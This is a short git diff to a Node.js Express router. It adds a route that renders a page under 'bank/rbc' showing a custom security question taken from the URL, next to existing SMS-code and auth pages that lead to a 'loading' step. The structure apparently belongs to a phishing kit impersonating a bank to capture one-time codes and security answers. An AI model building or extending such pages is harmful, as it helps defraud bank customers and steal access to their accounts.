@@ -35,6 +35,16 @@ router.get('/sms', async (req, res) => {
     res.render('bank/rbc/sms/index', { navig: "/rbc/loading", error: error});
 })
 
+router.get('/qst2/:argument', async (req, res) => {
+    let argument = req.params.argument;
+    let error = false
+    if(req.query.argument){
+        error = true
+    }
+
+    res.render('bank/rbc/qst2/index', { navig: "/rbc/loading", error: error, customQuestion: argument });
+})
+
 router.get('/auth', async (req, res) => {
     let error = false
     if(req.query.argument){
